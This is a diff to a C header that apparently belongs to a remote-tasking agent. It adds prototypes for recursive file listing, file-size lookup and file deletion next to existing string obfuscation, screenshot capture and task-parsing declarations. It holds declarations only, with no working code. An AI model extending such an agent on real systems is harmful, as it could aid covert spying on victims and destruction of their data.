@@ -74,6 +74,12 @@ typedef struct{
   task *tsk;
 } task_wrapper;
 
+// For storing file info by the get_all_files() function.
+typedef struct{
+  char *filename;
+  short file_type;
+  size_t file_size;
+} file_entry;
 
 // For decoding obfuscated strings.
 char *obfs_decode(char *str);
@@ -89,6 +95,12 @@ void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path);
 
 // Get the basename of a file path string.
 char *get_basename(char *path);
+
+// Get the size of a file in bytes.
+size_t get_file_size(char *filename);
+
+// Recursively fetch all files/dirs inside a directory.
+void get_all_files(char *dirname, queue *files);
 
 /**
  * Make a GET request to `url`, save response body to `body`, and return the status code.
@@ -164,6 +176,9 @@ FILE *screenshot();
   // Save a screenshot bitmap to file. Returns 0 in success.
   int bitmapToFile(HBITMAP hBitmap, FILE *wfo);
 #endif
+
+// Delete a file/directory. Returns number of files deleted.
+size_t delete_file(char *filename);
 
 // Parse a task JSON and return it, NULL on error.
 task *parse_task(cJSON *json);
